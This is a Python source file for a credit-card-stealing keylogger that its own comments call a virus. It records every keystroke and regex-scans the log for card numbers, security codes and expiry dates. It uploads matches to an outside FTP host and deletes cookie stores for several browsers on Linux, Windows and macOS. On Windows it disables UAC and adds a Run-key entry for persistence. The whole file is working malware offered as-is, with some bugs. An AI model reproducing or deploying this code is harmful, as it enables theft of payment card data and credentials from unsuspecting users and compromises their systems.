 # -*- coding: utf-8 -*-
from pynput.keyboard import Listener, Key
import re,os,platform,os.path,subprocess,ftplib

def ftp_Server_upload(txtfile):
	ftpinstance = ftplib.FTP('ftp.drivehq.com','USERNAME','PASSWORD')
	list1 = []
	ftpinstance.retrlines('NLST',list1.append)
	if 'txt_file' not in list1:
		print (os.getcwd())
		ftpinstance.storbinary('STOR txt_file',open(txtfile,'rb'))
	if 'txt_file' in list1 : 
		file1 = open('txtfile1','wb')
		ftpinstance.retrbinary('RETR txt_file',file1.write)
		file1.close()
		file1 = open('txt_file','ab')
		file2 = open(txtfile,'rb')
		file1.write(file2.read())
		file1.close()
		file2.close()
		os.remove('txt_file')
		ftpinstance.delete('txt_file')
		ftpinstance.storbinary('STOR txt_file',open('txtfile1','rb'))

def CCtxtf_Check_ScodeDate(line,item,brand):
	item = str(item)
	start_looking_here = line.find(item) + len(item) #position of the last number of the cc number
	finalslh = line[start_looking_here:]
	if re.search('visa|mastercard|diners club|jbc|discover',brand,flags=re.I) is not None:
		securitycodenumber = re.findall('[0-9]{3}',finalslh)
	if re.search('american', brand,flags=re.I) is not None:
		securitycodenumber = re.findall('[0-9]{4}',finalslh)
	if securitycodenumber:
		start_looking_here2 = line.find(securitycodenumber[0]) + len(securitycodenumber[0])
		finalslh2 = line[start_looking_here2:]
		expirationdate = re.findall('[0-9]{4}',finalslh2)
		try:
			file2=open('mailnamescap','r')
			line = file2.read()
			line = str(line)
			file2.close()
			if item not in line:
				file2 = open('mailnamescap','a')
				towrite = brand,item+':'+securitycodenumber[0]+':'+'Possible Data: 12/19'
				towrite = str(towrite)
				file2.write(towrite+'\n')
				file2.close()
				print ('Started ftp upload')
				ftp_Server_upload('mailnamescap')
			if expirationdate :
					file2 = open('mailnamescap','a')
					towrite = 'UpDate: '+brand,item+':'+securitycodenumber[0]+':'+expirationdate[0]
					towrite = str(towrite)
					file2.write(towrite+'\n')
					file2.close()
					file1 = open('modules_plugin','w')
					file1.close()
		except:
			pass
		
			
def check_txt_file(txt_file):#Function3 check txt_file for cc
	checkit = open(txt_file,'r')
	for line in checkit.readlines():
		line = str(line)
		Amercard = re.findall('3[47][0-9]{13}',line)
		if Amercard:
			brand = 'American Card cc'
			for item in Amercard:
				CCtxtf_Check_ScodeDate(line,item,brand)
		Mastercard = re.findall('5[1-5][0-9]{14}',line)
		if Mastercard:
			brand = 'Mastercard cc'
			for item in Mastercard:
				CCtxtf_Check_ScodeDate(line,item,brand)
		visacard = re.findall('4[0-9]{12}(?:[0-9]{3})?', line)
		if visacard:
			brand = 'Visa card cc'
			for item in visacard:
				CCtxtf_Check_ScodeDate(line,item,brand)
		dinersclubcc0 = re.findall('30[0-5][0-9]{11}',line)
		if dinersclubcc0:
			brand = 'Diners Club cc0'
			for item in dinersclubcc0:
				CCtxtf_Check_ScodeDate(line,item,brand)
		dinersclubcc1 = re.findall('3[68][0-9]{12}',line)
		if dinersclubcc1:
			brand = 'Diners Club cc1'
			for item in dinersclubcc1:
				CCtxtf_Check_ScodeDate(line,item,brand)
		dinersclubcc2 = re.findall('5[0-9]{15}',line)
		if dinersclubcc2:
			brand = 'Diners Club cc2'
			for item in dinersclubcc2:
				CCtxtf_Check_ScodeDate(line,item,brand)
		discovercard0 = re.findall('6011[0-9]{12}',line)
		if discovercard0:
			brand = 'Discover cc0'
			for item in discovercard0:
				CCtxtf_Check_ScodeDate(line,item,brand)
		discovercard1 = re.findall('65[0-9]{14}',line)
		if discovercard1:
			brand = 'Discover cc1'
			for item in discovercard1:
				CCtxtf_Check_ScodeDate(line,item,brand)
		jbccard0 = re.findall('2131[0-9]{11}',line)
		if jbccard0:
			brand = 'JBCcard cc0'
			for item in jbccard0:
				CCtxtf_Check_ScodeDate(line,item,brand)
		jbccard1 = re.findall('1800[0-9]{11}',line)
		if jbccard1:
			brand = 'JBCcard cc1'
			for item in jbccard1:
				CCtxtf_Check_ScodeDate(line,item,brand)
		jbccard2 = re.findall('35[0-9]{14}',line)
		if jbccard2:
			brand = 'JBCcard cc2'
			for item in jbccard2:
				CCtxtf_Check_ScodeDate(line,item,brand)

def write_totxt(key): #Function2 that appends each key to the create txt_file
	file1 = open('modules_plugin','a')
	file1.write(key)
	file1.close()

def on_press(key): #Function1 keylogger function 
	print ('Key',key,'was pressed')
	print (os.getcwd())
	try :
		if key == Key.backspace: #if backspace key pressed deletes last char in modules_plugin
			file3 = open('modules_plugin','r')
			filestring = file3.read()
			filestring = str(filestring)
			file3.close()
			filestring = filestring[:len(filestring)-1]
			print (filestring)
			file3 = open('modules_plugin','w')
			file3.write(filestring)
			file3.close()
		key = str(key)
		key = key.replace("'",'').replace('Key.space',' ')\
		.replace('Key.enter',' [>]enter[<] ').replace('Key.shift_r','')\
		.replace('Key.caps_lock','').replace('Key.ctrlc','').replace('Key.ctrlc','')\
		.replace('Key.ctrls','\n[>]Saved something[<]').replace('Key.alt','').replace('Key.backspace','')\
		.replace('Key.ctrlw','[>]Closed something[<]').replace('""',"'")#when ' written it converts to "" then "" == ' 
		write_totxt(key)
		check_txt_file('modules_plugin')
	except Exception as e:
		print (e)
def mozilla_Linux(homepath):
	mozillapath = homepath +'/.mozilla/firefox/'
	#print (mozillapath)
	if os.path.isdir(mozillapath):
		os.chdir(mozillapath)
		try:
			for item in os.listdir(mozillapath):
				if re.search('[0-9a-z]{8}|default|.default|.',item,flags=re.I) is not None:
					finalmozilpath = mozillapath+item
					#print (finalmozilpath)
					if os.path.isdir(finalmozilpath):
						os.chdir(finalmozilpath)
						if 'cookies.sqlite' in os.listdir(finalmozilpath) :
							os.remove('cookies.sqlite')
							os.chdir('/etc')
						else:
							os.chdir('/etc')
		except:
			pass
	else:
		pass

def Opera_Linux(homepath):
	Operapath = homepath +'/.opera/Opera Software/Opera Stable/'
	if os.path.isdir(Operapath):
		os.chdir(Operapath)
		try:
			if 'Cookies' in os.listdir(Operapath):
				os.remove('Cookies')
				os.chdir('/etc')
		except:
			pass
	else :
		pass

def GoogleChrome_Linux(homepath):
	Googlepath = homepath+'/.config/google-chrome/Default/'
	if os.path.isdir(Googlepath):
		os.chdir(Googlepath)
		try:
			if 'Cookies' in os.listdir(Googlepath):
				os.remove('Cookies')
				os.chdir('/etc')
		except:
			pass
	else :
		pass

def mozilla_windows(homepath):
	mozillapath = homepath +'\Mozilla\Firefox\Profiles\\'
	#print (mozillapath)
	if os.path.isdir(mozillapath):
		os.chdir(mozillapath)
		try:
			for item in os.listdir(mozillapath):
				if re.search('[0-9a-z]{8}|default|.default|.',item,flags=re.I) is not None:
					finalmozilpath = mozillapath+item
					#print (finalmozilpath)
					if os.path.isdir(finalmozilpath):
						if 'cookies.sqlite' in os.listdir(finalmozilpath) :
							os.remove(cookies.sqlite)
							os.chdir('D:\\Plugins_windows_'+loggeduser)
		except:
			pass
	else:
		pass
def Opera_windows(homepath):
	#~/.opera/Opera Software/Opera Stable/
	Operapath = homepath +'\\Opera Software\\Opera Stable\\'
	#print (mozillapath)
	if os.path.isdir(Operapath):
		os.chdir(Operapath)
		try:
			if 'Cookies' in os.listdir(Operapath):
				os.remove('Cookies')
				os.chdir('D:\\Plugins_windows_'+loggeduser)
		except:
			pass
	else:
		pass

def GoogleC_windows(homepath):
	Googlepath = homepath+"\\Google\\Chrome\\User Data\\Default\\"
	if os.path.isdir(Googlepath):
		os.chdir(Googlepath)
		try:
			if 'Cookies' in os.listdir(Googlepath):
				os.remove('Cookies')
				os.chdir('D:\\Plugins_windows_'+loggeduser)
		except:
			pass
	else:
		pass


def MicrosoftEdge_windows10(homepath): 
	homepathkl = homepath+'\\AppData\\Local\\Packages\\'
	if os.path.isdir(homepathkl) :
		os.chdir(homepathkl)
		for item in os.listdir(homepathkl):
			if re.search('Microsft.|Edge_|.Microsft',item,flags=re.I) is not None:
				homepath0 = homepathkl+item+'\\AC\\#!001\\MicrosoftEdge\\Cookies\\'
				homepath1 = homepathkl+item+'\\AC\\#!002\\MicrosoftEdge\\Cookies\\'
				homepath2 = homepathkl+item+'\\AC\\MicrosoftEdge\\Cookies\\'
				if os.path.isdir(homepath0):
					try:
						os.chdir(homepath0)
						for item in os.listdir(homepath0):
							os.remove(item)
					except:
						pass
				if os.path.isdir(homepath1):
					try:
						os.chdir(homepath1)
						for item in os.listdir(homepath1):
							os.remove(item)
					except:
						pass
				if os.path.isdir(homepath2):
					try:
						os.chdir(homepath2)
						for item in os.listdir(homepath2):
							os.remove(item)
					except:
						pass
				os.chdir('D:\\Plugins_windows_'+loggeduser)
	else:
		pass
	
def IEWin8(homepath):
	homepathie8 = homepath+'\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\'
	if os.path.isdir(homepathie8):
		os.chdir(homepathie8)
		for item in os.listdir(homepathie8):
			try:
				os.remove(item)
				os.chdir('D:\\Plugins_windows_'+loggeduser)
			except:
				pass
	else:
		pass

def InternetExplorer_win7(homepath):
	homepath7_1 = homepath + '\\Microsoft\\Windows\\Cookies\\'
	homepath7_2 = homepath +'\\Microsoft\\Windows\\Cookies\\Low\\'
	if os.path.isdir(homepath7_1):
		os.chdir(homepath7_1)
		try:
			for item in os.listdir(homepath7_1):
				os.remove(item)
		except:
			pass
	if os.path.isdir(homepath7_2):
		os.chdir(homepath7_2)
		try:
			for item in os.listdir(homepath7_2):
				os.remove(item)
		except:
			pass	
	os.chdir('D:\\Plugins_windows_'+loggeduser)

def Mozilla_MacOS(homepath):
	mozillapath = homepath +'Firefox/Profiles/'
	#print (mozillapath)
	if os.path.isdir(mozillapath):
		os.chdir(mozillapath)
		try:
			for item in os.listdir(mozillapath):
				if re.search('[0-9a-z]{8}|default|.default|.',item,flags=re.I) is not None:
					finalmozilpath = mozillapath+item
					#print (finalmozilpath)
					if os.path.isdir(finalmozilpath):
						if 'cookies.sqlite' in os.listdir(finalmozilpath) :
							os.remove(cookies.sqlite)
		except:
			pass
	else:
		pass

def Opera_MacOS(homepath):
	#~/.opera/Opera Software/Opera Stable/
	Operapath = homepath +'Opera Software/Opera Stable/'
	#print (mozillapath)
	if os.path.isdir(Operapath):
		os.chdir(Operapath)
		try:
			if 'Cookies' in os.listdir(Operapath):
				os.remove('Cookies')
		except:
			pass
	else:
		pass

def GoogleC_MacOS(homepath):
	Googlepath = homepath+'Google/Chrome/Default/'
	if os.path.isdir(Googlepath):
		os.chdir(Googlepath)
		try:
			if 'Cookies' in os.listdir(Googlepath):
				os.remove('Cookies')
		except:
			pass
	else:
		pass

def check_vict_env(): # Function1
	if re.search('Linux|Ubuntu',osv1,flags=re.I) is not None:
		pathoffile = "'"+os.getcwd()+"'"+'/KeyLogger_CC.py'
		os.chdir('/')
		for item in os.listdir(os.getcwd()):
			if item == 'etc':
				result = subprocess.Popen(['cp '+pathoffile+' /etc/'],shell=True)
				os.chdir(item)
				#create two txt files, one for input keys another to found cc in the first file
				file1 = open('modules_plugin','w')
				file1.close()
				file2 = open('mailnamescap','w')
				file2.close()
				try: 
					homepath = os.environ['HOME']
					if os.path.isdir(homepath):
						mozilla_Linux(homepath)
						Opera_Linux(homepath)
						GoogleChrome_Linux(homepath)
					else:
						pass
				except:
					loggeduser = os.getlogin()
					homepath = '/'+loggeduser
					if os.path.isdir(homepath):
						mozilla_Linux(homepath)
						Opera_Linux(homepath)
						GoogleChrome_Linux(homepath)
					else:
						pass
		print ('Cookies deleted and Keylogger is on now ! ')
	if re.search('Windows|Win',osv1,flags=re.I) is not None:
		try:
			subprocess.Popen('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /f /d "0"')
			subprocess.Popen('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /f /d "0"')
		except:
			pass
		cwdanfile = '"'+os.getcwd()+'\\KeyLogger_CC'+'"' #+'\\name of the file
		os.chdir('D:\\')
		os.mkdir('Plugins_windows_'+loggeduser)
		if os.path.isdir('D:\\Plugins_windows_'+loggeduser):
			setcwd = os.chdir('D:\\Plugins_windows_'+loggeduser)
			cwd = os.getcwd()
			subprocess.Popen('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersio‌​n\Run" /v "system32_plugin" /t REG_SZ /f /d '+'"'+cwd+'"')
			result = subprocess.Popen('copy '+cwdandfile+' "'+cwd+'\\system32backup'+'"',shell=True)
			file1 = open('modules_plugin','w') #txt files for pressed keys
			file1.close()
			file2 = open('mailnamescap','w') #txt file for found cc numbers in the first file "modules_plugin"
			file2.close()
		if re.search('vista|7|win7|windows7',osr,flags=re.I) is not None:
				try:
					homepath = os.environ['APPDATA']
					if os.path.isdir(homepath):
						mozilla_windows(homepath)
						Opera_windows(homepath)
						GoogleC_windows(homepath)
						InternetExplorer_win7(homepath)
					else:
						pass
				except:
					loggeduser = os.getlogin()
					homepath = 'C:\\Users\\'+loggeduser+'\\AppData\\Roaming'
					if os.path.isdir(homepath):
						mozilla_windows(homepath)
						Opera_windows(homepath)
						GoogleC_windows(homepath)
						InternetExplorer_win7(homepath)
					else:
						homepath = 'D:\\Users\\'+loggeduser+'\\AppData\\Roaming'
						if os.path.isdir(homepath):
							mozilla_windows(homepath)
							Opera_windows(homepath)
							GoogleC_windows(homepath)
							InternetExplorer_win7(homepath)
		else:
			pass
		print ('Cookies deleted and Keylogger is on now ! ')
		if re.search('8|win8|windows8|10|win10|windows10',osr,flags=re.I) is not None:
			try:
				homepath = os.environ['HOME']
				if os.path.isdir(homepath):
					MicrosoftEdge_windows10(homepath)
					IEWin8(homepath)
					mozilla_windows(homepath)
					Opera_windows(homepath)
					GoogleC_windows(homepath)
				else :
					pass
			except:
				loggeduser = os.getlogin()
				homepath = 'C:\\Users\\'+loggeduser
				if os.path.isdir(homepath):
					MicrosoftEdge_windows10(homepath)
					IEWin8(homepath)
					mozilla_windows(homepath)
					Opera_windows(homepath)
					GoogleC_windows(homepath)
				else :
					homepath = 'D:\\Users\\'+loggeduser
					if os.path.isdir(homepath):
						MicrosoftEdge_windows10(homepath)
						IEWin8(homepath)
						mozilla_windows(homepath)
						Opera_windows(homepath)
						GoogleC_windows(homepath)
		else:
			pass
	if re.search('Darwin|OS X|Mac',osv1,flags=re.I) is not None: 
		#copy virus to secure location + create file to get keystrokes
		try:
			homepath = os.environ['HOME']
			homepath = homepath+'/Library/Application Support/'
			if os.path.isdir(homepath):
				Mozilla_MacOS(homepath)
				Opera_MacOS(homepath)
				GoogleC_MacOS(homepath)
			else:
				pass
		except:
			loggeduser = os.getlogin()
			homepath = '/Users/'+loggeduser+'/Library/Application Support/'
			if os.path.isdir(homepath):
				Mozilla_MacOS(homepath)
				Opera_MacOS(homepath)
				GoogleC_MacOS(homepath)
			else:
				pass


# !! STARTS HERE !!
global tpk
tpk = 0 # var of the total pressed keys
global osv1,osr,homepath,loggeduser
loggeduser = os.getlogin()
osv1 = platform.system()
osr = platform.release()
homepath = os.environ['HOME']

with Listener( #MAIN FUNCTION
		on_press=on_press) as finallis:
	check_vict_env()
	finallis.join()


#MY NOTES:
#NEED TO CREATE TXT FILE FOR MAC LINE 412 
#Get several times the same cc, cause txt file with the user input is checked several
#time ; SOLUTION : if string in txt file of cc : do not append it 
